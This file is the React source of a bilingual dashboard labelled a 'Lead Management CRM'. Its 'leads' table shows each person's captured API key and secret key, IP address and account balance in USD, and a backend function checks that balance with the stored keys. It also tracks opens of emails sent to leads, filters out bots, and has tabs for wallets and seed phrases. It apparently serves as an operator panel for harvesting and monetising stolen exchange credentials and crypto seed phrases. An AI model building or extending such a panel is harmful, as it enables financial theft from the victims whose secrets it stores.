import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Shield, ShieldBan, User, Bot, Search, Filter, Copy, Server, DollarSign, LogOut } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/contexts/AuthContext';
import { useNavigate } from 'react-router-dom';
import { LeadFilters } from './LeadFilters';
import { LeadActions } from './LeadActions';
import { BotDetection } from './BotDetection';
import EmailLogsViewer from './EmailLogsViewer';
import WalletManagement from './WalletManagement';
import SeedPhraseManagement from './SeedPhraseManagement';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';

interface Lead {
  id: string;
  ip_address: unknown;
  user_agent: string | null;
  status: string | null;
  created_at: string;
  updated_at: string;
  api_key: string | null;
  secret_key: string | null;
  commercial_name: string | null;
  balance: number | null;
  balance_error: string | null;
  username: string;
  lastEmailActivity?: {
    user_id: string;
    sent_at: string;
    opened_at: string | null;
    open_count: number;
    status: string;
    recipient_email: string;
  } | null;
}

interface ServerConfig {
  id: string;
  current_server_ip: string;
  updated_at: string;
  created_at: string;
}

const CRMDashboard = () => {
  const [leads, setLeads] = useState<Lead[]>([]);
  const [filteredLeads, setFilteredLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(true);
  const [loadingMore, setLoadingMore] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedStatus, setSelectedStatus] = useState('all');
  const [language, setLanguage] = useState('en');
  const [currentPage, setCurrentPage] = useState(0);
  const [hasMore, setHasMore] = useState(true);
  const [currentServerIp, setCurrentServerIp] = useState('');
  const [editingServerIp, setEditingServerIp] = useState(false);
  const [tempServerIp, setTempServerIp] = useState('');
  const { toast } = useToast();
  const { logout } = useAuth();
  const navigate = useNavigate();

  const ITEMS_PER_PAGE = 20;

  // Detect browser language
  useEffect(() => {
    const browserLang = navigator.language.toLowerCase();
    setLanguage(browserLang.startsWith('fr') ? 'fr' : 'en');
  }, []);

  // Translations
  const t = {
    en: {
      title: 'Lead Management CRM',
      subtitle: 'Advanced API Security Center',
      totalLeads: 'Total Leads',
      activeLeads: 'Active Leads',
      blockedIps: 'Blocked IPs',
      potentialBots: 'Potential Bots',
      searchPlaceholder: 'Search leads...',
      apiKey: 'API Key',
      secretKey: 'Secret Key',
      ipAddress: 'IP Address',
      commercialName: 'Commercial Name',
      status: 'Status',
      balance: 'Balance (USD)',
      lastEmailActivity: 'Last Email Activity',
      createdAt: 'Created At',
      actions: 'Actions',
      active: 'Active',
      blocked: 'Blocked',
      suspicious: 'Suspicious',
      bot: 'Bot',
      blockIp: 'Block IP',
      unblockIp: 'Unblock IP',
      viewDetails: 'View Details',
      botDetected: 'Bot Detected',
      humanUser: 'Human User',
      loading: 'Loading leads...',
      loadingMore: 'Loading more...',
      loadMore: 'Load More',
      noLeads: 'No leads found',
      ipBlocked: 'IP address blocked successfully',
      ipUnblocked: 'IP address unblocked successfully',
      error: 'An error occurred',
      copied: 'Copied to clipboard',
      copyFailed: 'Failed to copy',
      currentServerIp: 'Current Server IP',
      editServerIp: 'Edit Server IP',
      saveServerIp: 'Save Server IP',
      cancel: 'Cancel',
      serverIpUpdated: 'Server IP updated successfully',
      checkingBalance: 'Checking balance...',
      balanceUpdated: 'Balance updated successfully'
    },
    fr: {
      title: 'CRM de Gestion des Leads',
      subtitle: 'Centre de Sécurité API Avancée',
      totalLeads: 'Total des Leads',
      activeLeads: 'Leads Actifs',
      blockedIps: 'IPs Bloquées',
      potentialBots: 'Bots Potentiels',
      searchPlaceholder: 'Rechercher des leads...',
      apiKey: 'Clé API',
      secretKey: 'Clé Secrète',
      ipAddress: 'Adresse IP',
      commercialName: 'Nom Commercial',
      status: 'Statut',
      balance: 'Solde (USD)',
      lastEmailActivity: 'Dernière Activité Email',
      createdAt: 'Créé le',
      actions: 'Actions',
      active: 'Actif',
      blocked: 'Bloqué',
      suspicious: 'Suspect',
      bot: 'Bot',
      blockIp: 'Bloquer IP',
      unblockIp: 'Débloquer IP',
      viewDetails: 'Voir Détails',
      botDetected: 'Bot Détecté',
      humanUser: 'Utilisateur Humain',
      loading: 'Chargement des leads...',
      loadingMore: 'Chargement en cours...',
      loadMore: 'Charger Plus',
      noLeads: 'Aucun lead trouvé',
      ipBlocked: 'Adresse IP bloquée avec succès',
      ipUnblocked: 'Adresse IP débloquée avec succès',
      error: 'Une erreur est survenue',
      copied: 'Copié dans le presse-papiers',
      copyFailed: 'Échec de la copie',
      currentServerIp: 'IP Serveur Actuelle',
      editServerIp: 'Modifier IP Serveur',
      saveServerIp: 'Sauvegarder IP Serveur',
      cancel: 'Annuler',
      serverIpUpdated: 'IP serveur mise à jour avec succès',
      checkingBalance: 'Vérification du solde...',
      balanceUpdated: 'Solde mis à jour avec succès'
    }
  };

  const currentLang = t[language as keyof typeof t];

  // Fetch leads with pagination
  useEffect(() => {
    fetchLeads(true);
    fetchServerConfig();
  }, []);

  // Fetch server configuration
  const fetchServerConfig = async () => {
    try {
      const { data, error } = await supabase
        .from('server_config')
        .select('*')
        .single();

      if (error && error.code !== 'PGRST116') {
        throw error;
      }

      if (data) {
        const serverIp = String(data.current_server_ip);
        setCurrentServerIp(serverIp);
        setTempServerIp(serverIp);
      }
    } catch (error) {
      console.error('Error fetching server config:', error);
    }
  };

  // Update server IP
  const updateServerIp = async () => {
    try {
      // Trim whitespace and validate IP format
      const trimmedServerIp = tempServerIp.trim();
      
      if (!trimmedServerIp) {
        toast({
          title: currentLang.error,
          description: 'Please enter a valid IP address',
          variant: 'destructive'
        });
        return;
      }

      // Basic IP format validation
      const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
      if (!ipRegex.test(trimmedServerIp)) {
        toast({
          title: currentLang.error,
          description: 'Please enter a valid IP address format (e.g., 192.168.1.1)',
          variant: 'destructive'
        });
        return;
      }

      const { data: existingConfig } = await supabase
        .from('server_config')
        .select('id')
        .single();

      if (existingConfig) {
        const { error } = await supabase
          .from('server_config')
          .update({ 
            current_server_ip: trimmedServerIp,
            updated_at: new Date().toISOString()
          })
          .eq('id', existingConfig.id);

        if (error) throw error;
      } else {
        const { error } = await supabase
          .from('server_config')
          .insert({ current_server_ip: trimmedServerIp });

        if (error) throw error;
      }

      setCurrentServerIp(trimmedServerIp);
      setTempServerIp(trimmedServerIp);
      setEditingServerIp(false);
      
      toast({
        title: currentLang.serverIpUpdated,
        description: `Server IP set to ${trimmedServerIp}`,
      });
    } catch (error) {
      console.error('Error updating server IP:', error);
      toast({
        title: currentLang.error,
        description: 'Failed to update server IP',
        variant: 'destructive'
      });
    }
  };

  // Fetch leads with pagination and email activity
  const fetchLeads = async (reset = false) => {
    try {
      if (reset) {
        setLoading(true);
        setCurrentPage(0);
      } else {
        setLoadingMore(true);
      }

      const startIndex = reset ? 0 : (currentPage + 1) * ITEMS_PER_PAGE;
      
      // First get the leads
      const { data: leadsData, error: leadsError } = await supabase
        .from('user_leads')
        .select('*')
        .order('created_at', { ascending: false })
        .range(startIndex, startIndex + ITEMS_PER_PAGE - 1);

      if (leadsError) throw leadsError;

      // Then get email activity for these leads
      let enrichedLeads = leadsData || [];
      
      if (leadsData && leadsData.length > 0) {
        const leadIds = leadsData.map(lead => lead.id);
        
        // Get latest email activity for each lead
        const { data: emailActivity, error: emailError } = await supabase
          .from('email_logs')
          .select('user_id, sent_at, opened_at, open_count, status, recipient_email')
          .in('user_id', leadsData.map(lead => lead.username))
          .order('sent_at', { ascending: false });

        if (!emailError && emailActivity) {
          // Group email activity by user_id (username)
          const emailByUser = emailActivity.reduce((acc, email) => {
            if (!acc[email.user_id] || new Date(email.sent_at) > new Date(acc[email.user_id].sent_at)) {
              acc[email.user_id] = email;
            }
            return acc;
          }, {} as Record<string, any>);

          // Enrich leads with email activity
          enrichedLeads = leadsData.map(lead => ({
            ...lead,
            lastEmailActivity: emailByUser[lead.username] || null
          }));
        }
      }

      if (reset) {
        setLeads(enrichedLeads);
        setFilteredLeads(enrichedLeads);
      } else {
        const newLeads = [...leads, ...enrichedLeads];
        setLeads(newLeads);
        setFilteredLeads(newLeads);
        setCurrentPage(prev => prev + 1);
      }

      setHasMore((leadsData || []).length === ITEMS_PER_PAGE);
    } catch (error) {
      console.error('Error fetching leads:', error);
      toast({
        title: currentLang.error,
        description: 'Failed to fetch leads',
        variant: 'destructive'
      });
    } finally {
      setLoading(false);
      setLoadingMore(false);
    }
  };

  // Check balance via webhook
  const checkBalance = async (leadId: string, apiKey: string, secretKey: string) => {
    try {
      if (!currentServerIp || !apiKey || !secretKey) {
        console.log('Missing required data for balance check');
        return;
      }

      const { data, error } = await supabase.functions.invoke('check-balance', {
        body: {
          api_key: apiKey,
          secret_key: secretKey,
          lead_id: leadId
        }
      });

      if (error) throw error;

      if (data?.success) {
        toast({
          title: currentLang.balanceUpdated,
          description: `Balance: $${data.balance_usd?.toFixed(2)} USD`,
        });

        fetchLeads(true); // Refresh the leads
      }
    } catch (error) {
      console.error('Error checking balance:', error);
      // Don't show error toast for balance checks as they might fail for various reasons
    }
  };

  // Filter leads
  useEffect(() => {
    let filtered = leads;

    if (searchTerm) {
      filtered = filtered.filter(lead =>
        lead.api_key?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (lead.ip_address && String(lead.ip_address).includes(searchTerm))
      );
    }

    if (selectedStatus !== 'all') {
      filtered = filtered.filter(lead => lead.status === selectedStatus);
    }

    setFilteredLeads(filtered);
  }, [leads, searchTerm, selectedStatus]);

  // Block/Unblock IP
  const handleIpAction = async (leadId: string, currentStatus: string) => {
    try {
      const newStatus = currentStatus === 'blocked' ? 'active' : 'blocked';
      
      const { error } = await supabase
        .from('user_leads')
        .update({ status: newStatus })
        .eq('id', leadId);

      if (error) throw error;

      toast({
        title: newStatus === 'blocked' ? currentLang.ipBlocked : currentLang.ipUnblocked,
        description: `Lead status updated to ${newStatus}`,
      });

      fetchLeads(true);
    } catch (error) {
      console.error('Error updating lead status:', error);
      toast({
        title: currentLang.error,
        description: 'Failed to update lead status',
        variant: 'destructive'
      });
    }
  };

  // Copy to clipboard
  const copyToClipboard = async (text: string | null) => {
    if (!text) return;
    
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: currentLang.copied,
        description: 'Key copied to clipboard',
      });
    } catch (error) {
      console.error('Error copying to clipboard:', error);
      toast({
        title: currentLang.copyFailed,
        description: 'Please copy manually',
        variant: 'destructive'
      });
    }
  };

  // Format key display
  const formatKey = (key: string | null, keyType: 'api' | 'secret') => {
    if (!key) return '-';
    
    return (
      <div className="flex items-center gap-2">
        <span className="font-mono text-sm">{key}</span>
        <button
          onClick={() => copyToClipboard(key)}
          className="text-gray-400 hover:text-white"
          title={`Copy ${keyType} key`}
        >
          <Copy className="h-4 w-4" />
        </button>
      </div>
    );
  };

  // Get status badge color
  const getStatusBadge = (status: string | null) => {
    switch (status) {
      case 'active':
        return <Badge variant="default" className="bg-green-500">{currentLang.active}</Badge>;
      case 'blocked':
        return <Badge variant="destructive">{currentLang.blocked}</Badge>;
      case 'suspicious':
        return <Badge variant="secondary" className="bg-yellow-500">{currentLang.suspicious}</Badge>;
      case 'bot':
        return <Badge variant="outline" className="bg-red-100 text-red-800">{currentLang.bot}</Badge>;
      default:
        return <Badge variant="outline">{status || 'Unknown'}</Badge>;
    }
  };

  // Statistics
  const stats = {
    total: leads.length,
    active: leads.filter(l => l.status === 'active').length,
    blocked: leads.filter(l => l.status === 'blocked').length,
    bots: leads.filter(l => l.status === 'bot').length
  };

  const handleLogout = () => {
    logout();
    navigate('/login');
  };

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3 mb-2">
              <Shield className="h-8 w-8 text-yellow-500" />
              <h1 className="text-3xl font-bold text-gray-900">{currentLang.title}</h1>
            </div>
            <Button 
              onClick={handleLogout}
              variant="outline"
              className="flex items-center gap-2"
            >
              <LogOut className="h-4 w-4" />
              Logout
            </Button>
          </div>
          <p className="text-gray-600">{currentLang.subtitle}</p>
        </div>

        {/* Server IP Configuration */}
        <Card className="mb-6">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Server className="h-5 w-5" />
              {currentLang.currentServerIp}
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex items-center gap-4">
              {editingServerIp ? (
                <>
                  <Input
                    value={tempServerIp}
                    onChange={(e) => setTempServerIp(e.target.value)}
                    placeholder="Enter server IP address"
                    className="flex-1"
                  />
                  <Button onClick={updateServerIp} size="sm">
                    {currentLang.saveServerIp}
                  </Button>
                  <Button 
                    onClick={() => {
                      setEditingServerIp(false);
                      setTempServerIp(currentServerIp);
                    }} 
                    variant="outline" 
                    size="sm"
                  >
                    {currentLang.cancel}
                  </Button>
                </>
              ) : (
                <>
                  <span className="font-mono text-lg bg-gray-100 px-3 py-2 rounded">
                    {currentServerIp || '127.0.0.1'}
                  </span>
                  <Button onClick={() => setEditingServerIp(true)} variant="outline" size="sm">
                    {currentLang.editServerIp}
                  </Button>
                </>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">
                {currentLang.totalLeads}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-gray-900">{stats.total}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">
                {currentLang.activeLeads}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-green-600">{stats.active}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">
                {currentLang.blockedIps}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-red-600">{stats.blocked}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">
                {currentLang.potentialBots}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-orange-600">{stats.bots}</div>
            </CardContent>
          </Card>
        </div>

        {/* Filters */}
        <Card className="mb-6">
          <CardContent className="pt-6">
            <div className="flex flex-col md:flex-row gap-4">
              <div className="flex-1">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
                  <Input
                    placeholder={currentLang.searchPlaceholder}
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pl-10"
                  />
                </div>
              </div>
              <div className="flex gap-2">
                <select
                  value={selectedStatus}
                  onChange={(e) => setSelectedStatus(e.target.value)}
                  className="px-3 py-2 border border-gray-300 rounded-md bg-white"
                >
                  <option value="all">All Status</option>
                  <option value="active">{currentLang.active}</option>
                  <option value="blocked">{currentLang.blocked}</option>
                  <option value="suspicious">{currentLang.suspicious}</option>
                  <option value="bot">{currentLang.bot}</option>
                </select>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Main Content with Tabs */}
        <Tabs defaultValue="leads" className="space-y-6">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="leads">Leads Database</TabsTrigger>
            <TabsTrigger value="emails">Email Activity</TabsTrigger>
            <TabsTrigger value="wallets">Wallet Management</TabsTrigger>
            <TabsTrigger value="seeds">Seed Phrases</TabsTrigger>
          </TabsList>
          
          <TabsContent value="leads">
            {/* Leads Table */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <User className="h-5 w-5" />
                  Leads Database
                </CardTitle>
              </CardHeader>
              <CardContent>
                {loading ? (
                  <div className="text-center py-8">
                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-yellow-500 mx-auto mb-4"></div>
                    <p className="text-gray-600">{currentLang.loading}</p>
                  </div>
                ) : filteredLeads.length === 0 ? (
                  <div className="text-center py-8">
                    <p className="text-gray-600">{currentLang.noLeads}</p>
                  </div>
                ) : (
                  <>
                    <div className="overflow-x-auto">
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>{currentLang.apiKey}</TableHead>
                            <TableHead>{currentLang.secretKey}</TableHead>
                            <TableHead>{currentLang.ipAddress}</TableHead>
                            <TableHead>{currentLang.commercialName}</TableHead>
                            <TableHead>{currentLang.balance}</TableHead>
                            <TableHead>{currentLang.status}</TableHead>
                            <TableHead>Bot Detection</TableHead>
                            <TableHead>{currentLang.lastEmailActivity}</TableHead>
                            <TableHead>{currentLang.createdAt}</TableHead>
                            <TableHead>{currentLang.actions}</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {filteredLeads.map((lead) => (
                            <TableRow key={lead.id}>
                              <TableCell>{formatKey(lead.api_key, 'api')}</TableCell>
                              <TableCell>{formatKey(lead.secret_key, 'secret')}</TableCell>
                              <TableCell className="font-mono text-sm">{String(lead.ip_address) || '-'}</TableCell>
                              <TableCell className="text-sm">{lead.commercial_name || '-'}</TableCell>
                              <TableCell>
                                <div className="flex items-center gap-2">
                                  {lead.balance_error ? (
                                    <div className="flex flex-col">
                                      <div className="flex items-center gap-1 text-red-500">
                                        <span className="text-sm">Error:</span>
                                        <span className="text-xs">{lead.balance_error}</span>
                                      </div>
                                      <Button
                                        size="sm"
                                        variant="outline"
                                        onClick={() => checkBalance(lead.id, lead.api_key || '', lead.secret_key || '')}
                                        className="mt-1 text-xs"
                                      >
                                        ↻ Retry
                                      </Button>
                                    </div>
                                  ) : (
                                    <>
                                      <DollarSign className="h-4 w-4 text-green-500" />
                                      <span className="font-semibold">
                                        {lead.balance !== null ? `$${lead.balance.toFixed(2)}` : '$0.00'}
                                      </span>
                                      <Button
                                        size="sm"
                                        variant="outline"
                                        onClick={() => checkBalance(lead.id, lead.api_key || '', lead.secret_key || '')}
                                        className="ml-2"
                                      >
                                        ↻
                                      </Button>
                                    </>
                                  )}
                                </div>
                              </TableCell>
                              <TableCell>{getStatusBadge(lead.status)}</TableCell>
                              <TableCell>
                                <BotDetection userAgent={lead.user_agent} language={language} />
                              </TableCell>
                              <TableCell>
                                {lead.lastEmailActivity ? (
                                  <div className="text-sm">
                                    <div className="flex items-center gap-2">
                                      <Badge 
                                        variant={lead.lastEmailActivity.open_count > 0 ? "default" : "outline"}
                                        className={lead.lastEmailActivity.open_count > 0 ? "bg-green-600" : ""}
                                      >
                                        {lead.lastEmailActivity.open_count > 0 ? `Opened (${lead.lastEmailActivity.open_count})` : 'Sent'}
                                      </Badge>
                                    </div>
                                    <div className="text-xs text-gray-500 mt-1">
                                      {new Date(lead.lastEmailActivity.sent_at).toLocaleDateString()} {new Date(lead.lastEmailActivity.sent_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                                    </div>
                                    <div className="text-xs text-gray-400 truncate max-w-32" title={lead.lastEmailActivity.recipient_email}>
                                      {lead.lastEmailActivity.recipient_email}
                                    </div>
                                  </div>
                                ) : (
                                  <span className="text-gray-400 text-sm">No emails sent</span>
                                )}
                              </TableCell>
                              <TableCell>
                                <div className="text-sm">
                                  <div>{new Date(lead.created_at).toLocaleDateString()}</div>
                                  <div className="text-xs text-gray-500">{new Date(lead.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</div>
                                </div>
                              </TableCell>
                              <TableCell>
                                <div className="flex gap-2">
                                  <Button
                                    size="sm"
                                    variant={lead.status === 'blocked' ? 'default' : 'destructive'}
                                    onClick={() => handleIpAction(lead.id, lead.status || 'active')}
                                  >
                                    {lead.status === 'blocked' ? (
                                      <>
                                        <Shield className="h-4 w-4 mr-1" />
                                        {currentLang.unblockIp}
                                      </>
                                    ) : (
                                      <>
                                        <ShieldBan className="h-4 w-4 mr-1" />
                                        {currentLang.blockIp}
                                      </>
                                    )}
                                  </Button>
                                </div>
                              </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </div>
                    
                    {/* Load More Button */}
                    {hasMore && (
                      <div className="text-center mt-6">
                        <Button
                          onClick={() => fetchLeads(false)}
                          disabled={loadingMore}
                          variant="outline"
                        >
                          {loadingMore ? currentLang.loadingMore : currentLang.loadMore}
                        </Button>
                      </div>
                    )}
                  </>
                )}
              </CardContent>
            </Card>
          </TabsContent>
          
          <TabsContent value="emails">
            <EmailLogsViewer />
          </TabsContent>
          
          <TabsContent value="wallets">
            <WalletManagement />
          </TabsContent>
          
          <TabsContent value="seeds">
            <SeedPhraseManagement />
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default CRMDashboard;
